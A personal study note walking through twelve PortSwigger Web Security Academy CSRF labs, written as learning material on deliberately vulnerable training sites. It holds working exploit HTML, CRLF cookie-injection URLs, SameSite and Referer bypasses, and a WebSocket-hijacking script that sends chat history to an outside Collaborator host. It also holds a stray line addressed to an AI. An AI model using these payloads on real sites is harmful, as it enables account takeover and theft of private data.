---
created: 2026-05-15
---

- XSS: 1 lab
- CORS: 3 labs
- Clickjacking: 5 labs
- DOM: 5 labs

22 labs

| `#`   | Solved? | Name                                                          | Date    | Notes                      |
| ----- | ------- | ------------------------------------------------------------- | ------- | -------------------------- |
| `1.`  | `✓`     | CSRF vulnerability with no defenses                           | `15.05` |                            |
| `2.`  | `✓`     | CSRF where token validation depends on request method         | `16.05` |                            |
| `3.`  | `✓`     | CSRF where token validation depends on token being present    | `16.05` |                            |
| `4.`  | `✓`     | CSRF where token is not tied to user session                  | `16.05` |                            |
| `5.`  | `✓`     | CSRF where token is tied to non-session cookie                | `16.05` |                            |
| `6.`  | `✓`     | CSRF where token is duplicated in cookie                      | `08.06` |                            |
| `7.`  | `✓`     | SameSite Lax bypass via method override                       | `16.05` |                            |
| `8.`  | `✓`     | SameSite Strict bypass via client-side redirect               | `16.05` |                            |
| `9.`  | `✓`     | SameSite Strict bypass via sibling domain                     | `03.05` | #Collaborator<br>#revision |
| `10.` | `✓`     | SameSite Lax bypass via cookie refresh                        | `03.05` | #revision                  |
| `11.` | `✓`     | CSRF where Referer validation depends on header being present | `17.05` |                            |
| `12.` | `✓`     | CSRF with broken Referer validation                           | `17.05` |                            |


## 1. CSRF vulnerability with no defenses

>[!done]

>[!note]+ Lab description
> - [`Lab: CSRF vulnerability with no defenses`](https://portswigger.net/web-security/csrf/lab-no-defenses)
> - Level: #Apprentice 
> 
> This lab's email change functionality is vulnerable to CSRF.
> 
> To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
> 
> You can log in to your own account using the following credentials: `wiener:peter`


### Solution

- Log in as `wiener` and test the change email functionality:

![[images/walkthrough/PortSwigger/CSRF/lab1/1.png]]

- Observe there are no defenses against CSRF.
- Construct a PoC and paste it into your exploit server:

```html
<html>
    <body>
        <form action="https://0a0a0054034be3dd82eb5b0200c800c8.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@email.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

- `Store` then `View exploit`. 
- Verify your email has been changed.

![[images/walkthrough/PortSwigger/CSRF/lab1/3.png]]

- Change email in the exploit, `Store` again, then `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/CSRF/lab1/solved.png]]

Solved!
## 2. CSRF where token validation depends on request method

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: CSRF where token validation depends on request method`](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)
> - Level: #Practitioner 
> 
> This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and change your email. Send the request to `Repeater` and attempt the same action without the CSRF token:

![[images/walkthrough/PortSwigger/CSRF/lab2/1.png]]

- Observe the request is rejected with the message `"Missing parameter 'csrf'"`. The same happens if the `csrf` parameter is empty.
- If you submit an invalid value, the application responds with `"Invalid CSRF token"`. 
- This means the token is actually validated on the server, *at least when the `POST` request method is used*. 
- Right-click on the request -> `Change request method`:

![[images/walkthrough/PortSwigger/CSRF/lab2/2.png]]

- Then send the request. Notice the application accept it.

![[images/walkthrough/PortSwigger/CSRF/lab2/3.png]]

- In your account, confirm the email has changed:

![[images/walkthrough/PortSwigger/CSRF/lab2/4.png]]

- Construct the payload:

```html
<img src="https://0a2b004203a6642180c4032600d70082.web-security-academy.net/my-account/change-email?email=pwned1%40example.com&csrf=anything">
```

![[images/walkthrough/PortSwigger/CSRF/lab2/5.png]]

- Then `Store` and `View exploit`. Verify your email has changed.

![[images/walkthrough/PortSwigger/CSRF/lab2/6.png]]

- Change the email in the payload once more, `Store`, and `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/CSRF/lab2/solved.png]]

Solved!
## 3. CSRF where token validation depends on token being present

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: CSRF where token validation depends on token being present`](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)
> - Level: #Practitioner 
> 
> 
> This lab's email change functionality is vulnerable to CSRF.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and change your email. Send the request to `Repeater` and attempt the same action without the CSRF token:

![[images/walkthrough/PortSwigger/CSRF/lab3/1.png]]

- The request is accepted. In your account, verify the email has changed.

- Craft the exploit:

```html
<html>
    <body>
        <form action="https://0ad1005c043f5a4486707b1a0001003f.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned1@email.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

![[images/walkthrough/PortSwigger/CSRF/lab3/2.png]]

- `Store` then `View exploit`. Verify the action succeeded. 
- Change the email in the exploit once more and `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/CSRF/lab3/solved.png]]

Solved!
## 4. CSRF where token is not tied to user session

>[!done]

>[!note]+ Lab description
>  
> - [`Lab: CSRF where token is not tied to user session`](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)
> - Level: #Practitioner 
> 
> 
> This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
> 
> - `wiener:peter`
> - `carlos:montoya`

### Solution

- Log in as `wiener` and change your email. Notice the CSRF token is generated per-request.
- Send the request to `Repeater` and attempt the same action without the CSRF token.
- Observe the request is rejected with the message `"Missing parameter 'csrf'"`. The same happens if the `csrf` parameter is empty.

- Open an incognito window and log in as `carlos`. Copy their session cookie. 
- Paste the `carlos`'s session cookie to the `wiener`'s email change request (and change the email itself). 
- Copy a CSRF token from the `wiener`'s account page and paste it into the request.
- Send the request:

![[images/walkthrough/PortSwigger/CSRF/lab4/1.png]]

- The action succeeds. Construct the payload:

```html
<html>
    <body>
        <form action="https://0a7c00120423ab2080552b8e009f0061.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned2@examaple.com" />
            <input type="hidden" name="csrf" value="Hldg3qGXjXtEtgitcFRiRhWAb1nKQuE9">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>w
```

- The CSRF token should be copied from the `wiener`'s page.
- `Store` and `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/CSRF/lab4/2.png]]


![[images/walkthrough/PortSwigger/CSRF/lab4/solved.png]]

Solved!

## 5. CSRF where token is tied to non-session cookie

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: CSRF where token is tied to non-session cookie`](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)
> - Level: #Practitioner 
> 
> This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
> 
> - `wiener:peter`
> - `carlos:montoya`

### Solution

- Log in as `wiener` and change your email. Inspect the request:

![[images/walkthrough/PortSwigger/CSRF/lab5/1.png]]

- Notice there are two cookies: one session and one related to CSRF. It is possible that the application verifies the CSRF token submitted in the request using that non-session cookie.
- Send this request to `Repeater`.

>[!note] Submit requests several times to ensure the token is not generated per-request.

- Open an Incognito window and log in as `carlos`. Change their email, too, and inspect the request:

![[images/walkthrough/PortSwigger/CSRF/lab5/2.png]]

- Observe the same pattern. 
- Copy the `csrfkey` cookie from the `carlos`'s request and paste it to the `wiener`'s request. Do the same with the CSRF token. 
- This is what you should get (also change the email to avoid collisions):

```HTTP
POST /my-account/change-email HTTP/2
Host: 0a2c00b8035e9291805e03b200260033.web-security-academy.net
Cookie: csrfKey=LeJ3Bo4q1hY16DiReSayLtPLJRNiZXsC; session=0s86SMdy3dulagWMvA8zkPxRehAczgqA
# carlos's csrfKey and wiener's session
# SNIP

email=pwned%40example.com&csrf=jsiE7Pcdzw96hjlvCfMYJKpfvz5zoEM6
# carlos's CSRF token
```

- Send the request, see the application doesn't throw an error:

![[images/walkthrough/PortSwigger/CSRF/lab5/3.png]]

- In the `wiener`'s profile, see the email has changed:

![[images/walkthrough/PortSwigger/CSRF/lab5/4.png]]

- The next step is to find a way to force the victim's browser to set cookies. Two common ways to do that:
	- CRLF injection
	- Subdomain cookie injection
- Since there're no subdomains for the lab, it is likely there's a CRLF injection vulnerability somewhere.
- Go do the main page, enter a test query, and inject a URL-encoded `\r\n` sequence followed by a dummy HTTP header:

```
https://0a2c00b8035e9291805e03b200260033.web-security-academy.net/?search=test%0D%0ASet-Cookie:%20anything=something
```

![[images/walkthrough/PortSwigger/CSRF/lab5/5.png]]

- This is exploitable.
- Craft the payload:

```html
<html>
	<img src="https://0a2c00b8035e9291805e03b200260033.web-security-academy.net/?search=test%0D%0ASet-Cookie:%20csrfKey=LeJ3Bo4q1hY16DiReSayLtPLJRNiZXsC%3B%20SameSite=None">
    <body>
        <form action="https://0a2c00b8035e9291805e03b200260033.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned1@examaple.com" />
            <input type="hidden" name="csrf" value="jsiE7Pcdzw96hjlvCfMYJKpfvz5zoEM6">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

- `Store` then `View exploit`.

![[images/walkthrough/PortSwigger/CSRF/lab5/6.png]]

- In Burp history, observe the request to the `<img>` source, which sets the cookie; go to the `wiener`'s account and see the email has changed.

- In the exploit, change the email again, `Store`, and `Deliver exploit to victim`:

![[images/walkthrough/PortSwigger/CSRF/lab5/7.png]]

![[images/walkthrough/PortSwigger/CSRF/lab5/solved.png]]

Solved!
## 6. CSRF where token is duplicated in cookie

>[!done]

>[!note]+ Lab description
> - [`Lab: CSRF where token is duplicated in cookie`](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)
> - Level: #Practitioner 
> This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Browse the application first. Test the blog search functionality and inspect the request.
- Notice the application sets the `LastSearchTerm` cookie to the value of your last search:

![[images/walkthrough/PortSwigger/CSRF/lab6/1.png]]

- In other words, your input is reflected in application response headers.

![[images/walkthrough/PortSwigger/CSRF/lab6/2.png]]


- Log in as `wiener` and change your email. Inspect the request:

![[images/walkthrough/PortSwigger/CSRF/lab6/1.png]]

- Notice the `csrf` cookie and `csrf` parameter values in the request are exactly the same. Send the request to `Repeater` and set both to an arbitrary value, such as `attacker123`, and change the email:

![[images/walkthrough/PortSwigger/CSRF/lab6/2.png]]

- You might be able to inject additional headers using a CRLF sequence. Send this search request to `Repeater` and modify the `search` parameter:

```
/?search=test%0D%0ASet-Cookie:%20cookie=value%3b%20SameSite=None
```

![[images/walkthrough/PortSwigger/CSRF/lab6/3.png]]

- The CRLF injection works, and you can set arbitrary cookies using a `GET` request.

---

- Log in as `wiener` and test the email change functionality. Notice the CSRF token is duplicated in the cookie and request parameter. 

![[images/walkthrough/PortSwigger/CSRF/lab6/4.png]]


- Send this request to `Repeater` and set both tokens to an arbitrary value, such as `123`. Change the email and send the request:

![[images/walkthrough/PortSwigger/CSRF/lab6/5.png]]

- See the application accepts the request and changes your address:

![[images/walkthrough/PortSwigger/CSRF/lab6/6.png]]

---

- Combining the CRLF injection and duplicated CSRF token finding, construct an exploit:

```html
<html>
	<img src="https://0add00430471493b808d674b00ea00db.web-security-academy.net/?search=test%0D%0ASet-Cookie:%20csrf=111%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
    <body>
        <form action="https://0add00430471493b808d674b00ea00db.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned0@example.com" />
            <input type="hidden" name="csrf" value="111">
        </form>
    </body>
</html>
```

- The exploit is similar to the one used in the previous lab. However, instead of using `<script>` to submit the form, but use the `onerror` handler. 
- The reason is because the cookie injection via the CRLF vulnerability must happen **before** the form is submitted. If you used `<script>document.forms[0].submit();</script>`, both the CRLF injection and email change form submission execute almost at the same time (in parallel).
- But with the `onerror` handler, the JavaScript only executes *after* the browser makes a request to the URL specified in the `src` attribute *and* receives a response (`onerror` fires because the URL returns a normal page, not a valid image).
- `SameSite=None` is needed so the injected cookie is sent even on cross-site requests.

![[images/walkthrough/PortSwigger/CSRF/lab6/7.png]]

- Click `Store` then `View exploit`. See your email changes:

![[images/walkthrough/PortSwigger/CSRF/lab6/8.png]]

- Go back to the exploit server. Change the email in the exploit (e.g., `pwned0` -> `pwned1`), click `Store` again, then `Deliver exploit to victim`. 



![[images/walkthrough/PortSwigger/CSRF/lab6/solved.png]]

Solved!

## 7. SameSite Lax bypass via method override

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: SameSite Lax bypass via method override`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)
> - Level: #Practitioner 
> 
> This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
> 
> You can log in to your own account using the following credentials: `wiener:peter`


### Solution

- Log in as `wiener` and change your email. Inspect the request:

![[images/walkthrough/PortSwigger/CSRF/lab7/1.png]]

- Notice the application doesn't set the `SameSite` attribute for the `session` cookie and doesn't implement any CSRF token protection. 
- In Chrome, by default, `SameSite` is set to `Lax`. This means that `GET` requests should work.
- In `Repeater`, change the request method to `GET` and send the request:

![[images/walkthrough/PortSwigger/CSRF/lab7/2.png]]

- `"Method Not Allowed"`. Attempt to override the method by appending the `_method` parameter set to `POST`:

![[images/walkthrough/PortSwigger/CSRF/lab7/3.png]]

- The request is accepted. Verify the email has changed:

![[images/walkthrough/PortSwigger/CSRF/lab7/4.png]]


- Craft the exploit:

```html
<script>
	window.location = "https://0a69004b04732f7880753aa900f500f4.web-security-academy.net/my-account/change-email?email=pwned1%40example.com&_method=POST"
</script>
```

![[images/walkthrough/PortSwigger/CSRF/lab7/5.png]]

- `Store` and `View exploit`. Verify your email has changed one more time.
- Change the email again, `Store`, and `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/CSRF/lab7/solved.png]]

Solved!
## 8. SameSite Strict bypass via client-side redirect

>[!done]

>[!note]+ Lab description
> - [`Lab: SameSite Strict bypass via client-side redirect`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)
> - Level: #Practitioner 
> 
> This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener`. Observe that the session cookie is set with `SameSite=Strict`:

![[images/walkthrough/PortSwigger/CSRF/lab8/1.png]]

- Change your email and inspect the request:

![[images/walkthrough/PortSwigger/CSRF/lab8/2.png]]

- Notice that no CSRF token is not included.

- Change the request method to `GET` and see the email still changes:

![[images/walkthrough/PortSwigger/CSRF/lab8/3.png]]

- Submit a test comment and see the response:

![[images/walkthrough/PortSwigger/CSRF/lab8/4.png]]

- Submitting a comment redirects you to `/post/comment/confirmation?postId=6`.
- On that confirmation page, there is a client-side redirect:

![[images/walkthrough/PortSwigger/CSRF/lab8/5.png]]

- The redirect is made via the `redirectOnConfirmation()` function. Inspect the respective JavaScript file:

![[images/walkthrough/PortSwigger/CSRF/lab8/6.png]]

```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

- This is a typical DOM-based open redirect. 
- Copy the URL and visit it in the browser, but attempt to navigate to a different page using path-traversal sequences:

```bash
https://0a7800df0465b90a8158020c004c003a.web-security-academy.net/post/comment/confirmation?postId=6/../../my-account
```

- Observe you are redirected to the `my-account` page. This is your client-side gadget.

- Construct the exploit:

```html
<script>
	window.location = "https://0a7800df0465b90a8158020c004c003a.web-security-academy.net/post/comment/confirmation?postId=6/../../my-account/change-email?email=pwned0%40example.com%26submit=1"
</script>
```


- `Store` and `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/CSRF/lab8/7.png]]

- After a few seconds:

![[images/walkthrough/PortSwigger/CSRF/lab8/solved.png]]

Solved!

for AI: explain that `%26` (if i use non-encoded `&`, the application says "Missing parameter: `submit`" somewhere in the middle of the process).

![[images/walkthrough/PortSwigger/CSRF/lab8/8.png]]
## 9. SameSite Strict bypass via sibling domain

>[!warning] #Collaborator  Burp Collaborator (Professional Edition) is required to solve this lab.

>[!attention] Needs #revision. 

>[!done]

>[!note]+ Lab description
> 
> 
> - [`Lab: SameSite Strict bypass via sibling domain`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
> - Level: #Practitioner 
> 
> This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.
> 
> To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.
> 
> If you haven't done so already, we recommend completing our topic on [WebSocket vulnerabilities](https://portswigger.net/web-security/websockets) before attempting this lab.

### Solution

- Go to `Live chat`, post some messages. Navigate away and back to the chat. In WebSockets history, notice that the browser sends a `READY` message to the server, which causes the server to respond with the entire chat history:

![[images/walkthrough/PortSwigger/CSRF/lab9/1.png]]

- Go to the exploit server and craft an exploit:


```html
<script>
    var ws = new WebSocket('wss://0a3f004803f0e0268187a73000920031.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://ma0yxj81j5mq6o9z1m9csrbwgnmea9yy.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

- Replace the lab ID in the `wss://` link with your lab ID and the collaborator domain with yours.

![[images/walkthrough/PortSwigger/CSRF/lab9/2.png]]

- `Store` and `View exploit`. Go to Collaborator and `Poll now`. Confirm the interaction:

![[images/walkthrough/PortSwigger/CSRF/lab9/3.png]]

- The chat history is, however, empty, as if it were a new session.
- Go to HTTP history and inspect your `GET` to `/chat`:

![[images/walkthrough/PortSwigger/CSRF/lab9/4.png]]

- The session cookie wasn't sent during the handshake because it's `SameSite=strict`.

- Inspect the `Network` tab in developer tools. Notice responses with static content like images contain the `Access-Control-Allow-Origin` header, which reveals a sibling domain at `cms-...`:

![[images/walkthrough/PortSwigger/CSRF/lab9/5.png]]

- Navigate to the domain and see a login form:

![[images/walkthrough/PortSwigger/CSRF/lab9/6.png]]

- Enter test credentials and see the username is reflected on the page:

![[images/walkthrough/PortSwigger/CSRF/lab9/7.png]]

- Try XSS:
  
  ![[images/walkthrough/PortSwigger/CSRF/lab9/8.png]]

- In `Repeater`, right-click on the request -> `Change request method` to convert the method to `GET`. Confirm that it still receives the same response:

![[images/walkthrough/PortSwigger/CSRF/lab9/10.png]]


 - Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being stopped by `SameSite` restrictions.
 ---
- Take your previous exploit and URL-encode it.

```html
<script>
    var ws = new WebSocket('wss://0a3f004803f0e0268187a73000920031.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://jrevegpy023nnlqwijq99ostxk3br7fw.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

```js
%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a3f004803f0e0268187a73000920031%2Eweb%2Dsecurity%2Dacademy%2Enet%2Fchat%27%29%3B%0A%20%20%20%20ws%2Eonopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws%2Esend%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws%2Eonmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fjrevegpy023nnlqwijq99ostxk3br7fw%2Eoastify%2Ecom%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no%2Dcors%27%2C%20body%3A%20event%2Edata%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E
```


- Create a new exploit:

```html
<script>
window.location = "https://cms-0a3f004803f0e0268187a73000920031.web-security-academy.net/login?username=%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a3f004803f0e0268187a73000920031%2Eweb%2Dsecurity%2Dacademy%2Enet%2Fchat%27%29%3B%0A%20%20%20%20ws%2Eonopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws%2Esend%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws%2Eonmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fjrevegpy023nnlqwijq99ostxk3br7fw%2Eoastify%2Ecom%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no%2Dcors%27%2C%20body%3A%20event%2Edata%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=anything"
</script>
```

![[images/walkthrough/PortSwigger/CSRF/lab9/11.png]]

- `Store` then `Deliver exploit to victim`. To go `Collaborator` -> `Poll now`.
- Retrieve `carlos`'s chat history and find their password:

![[images/walkthrough/PortSwigger/CSRF/lab9/12.png]]

- Log in as `carlos`.

![[images/walkthrough/PortSwigger/CSRF/lab9/solved.png]]

Solved!
## 10. SameSite Lax bypass via cookie refresh

>[!attention] Needs #revision. 

>[!done]

>[!note]+ Lab description
> - [`Lab: SameSite Lax bypass via cookie refresh`](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)
> - Level: #Practitioner 
> 
This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
> 
> The lab supports OAuth-based login. You can log in via your social media account with the following credentials: `wiener:peter`

### Solution

- Log in via social media account as `wiener`:

![[images/walkthrough/PortSwigger/CSRF/lab10/1.png]]

- See the application doesn't set the `SameSite` cookie attribute, which means it is set to the default `Lax` (at least in Chrome). 

>[!important] When `SameSite=Lax` is set by default, cookie restrictions are not applied `120` seconds after authentication. 


- Change your email address and inspect the request:

![[images/walkthrough/PortSwigger/CSRF/lab10/2.png]]

- See no CSRF token is used. 
- Craft an exploit:

```html
<form method="POST" action="https://0a5600ff04720663816789aa006e00d7.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0a5600ff04720663816789aa006e00d7.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```


![[images/walkthrough/PortSwigger/CSRF/lab10/3.png]]

- After a few seconds:

![[images/walkthrough/PortSwigger/CSRF/lab10/solved.png]]

Solved!
## 11. CSRF where Referer validation depends on header being present

>[!done]

>[!note]+ Lab description
> - [`Lab: CSRF where Referer validation depends on header being present`](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)- Level: #Practitioner 
> 
> This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You can log in to your own account using the following credentials: `wiener:peter`


### Solution

- Log in as `wiener` and inspect the response:

![[images/walkthrough/PortSwigger/CSRF/lab11/1.png]]

- Notice that the `session` cookie is set the `SameSite=None` attribute, which means the session cookie is included in **all** cross-site requests.
- Test the email changing functionality:

![[images/walkthrough/PortSwigger/CSRF/lab11/2.png]]

- Notice the application doesn't implement CSRF token protection.
- Craft an exploit:

```html
<html>
    <body>
        <form action="https://0ab300fe04c10b1b80b1c6f400fc00b4.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@example.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

![[images/walkthrough/PortSwigger/CSRF/lab11/3.png]]

- `Store` and `View exploit`.

![[images/walkthrough/PortSwigger/CSRF/lab11/4.png]]

- The application responds with an error: `"Invalid referer header"`. This means it relies on `Referer` header as a defense against CSRF.

- The header in the cross-site request is set to your exploit server. 
- Suppress this `Referer` header entirely:

```html
<html>
	<head>
		<!-- suppress Referer for all requests from this page -->
		<meta name="referrer" content="no-referrer" />
	</head>
    <body>
        <form action="https://0ab300fe04c10b1b80b1c6f400fc00b4.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@example.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

- `Store` then `View exploit`. Observe your email has changed.

![[images/walkthrough/PortSwigger/CSRF/lab11/5.png]]

- Change the email in the exploit once more and `Deliver exploit to vitcim`.

![[images/walkthrough/PortSwigger/CSRF/lab11/solved.png]]

Solved!
## 12. CSRF with broken Referer validation

>[!done]

>[!note]+ Lab description
> - [`Lab: CSRF with broken Referer validation`](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)
> - Level: #Practitioner 
> 
> This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
> 
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
> 
> You can log in to your own account using the following credentials: `wiener:peter`
### Solution

- Log in as `wiener` and test the email change functionality:

![[images/walkthrough/PortSwigger/CSRF/lab12/1.png]]


- Send the request to `Repeater`. Observe that if you change the header, the application responds with an error:

![[images/walkthrough/PortSwigger/CSRF/lab12/2.png]]

- The error persists if you remove the header entirely.
- This means the application verifies both the presence and the value of the `Referer` header. 
- If the validation is flawed, such as if the application only checks the trusted domain appears *somewhere* in the `Referer` URL, you may be able to bypass it by setting `Referer` to something like this:

```http
Referer: https://example.com?0a0800a603ab3b3a80d4fd39004100ce.web-security-academy.net
```

- the trick works:

![[images/walkthrough/PortSwigger/CSRF/lab12/3.png]]


- Craft an exploit:

```html
<html>
    <body>
        <form action="https://0a0800a603ab3b3a80d4fd39004100ce.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@example.com" />
        </form>
        <script>
	        history.pushState("", "", "/?0a0800a603ab3b3a80d4fd39004100ce.web-security-academy.net")

            document.forms[0].submit();
        </script>
    </body>
</html>
```

- `history.pushState("", "", "/?0a0800a603ab3b3a80d4fd39004100ce.web-security-academy.net")` will cause the `Referer` header in the generated request to contain the URL of the target site in the query string.
- If you `Store` and `View exploit` now, the error persists, because browsers strip query strings from `Referer` by default. To avoid this, include the `Referrer-Policy` response header:

```http
Referrer-Policy: unsafe-url
```

- The exploit should look like this:


![[images/walkthrough/PortSwigger/CSRF/lab12/4.png]]

- `Store` and `View exploit`.
- Observe your email changes:

![[images/walkthrough/PortSwigger/CSRF/lab12/5.png]]

- Change the email in the exploit once more and `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/CSRF/lab12/solved.png]]

Solved!

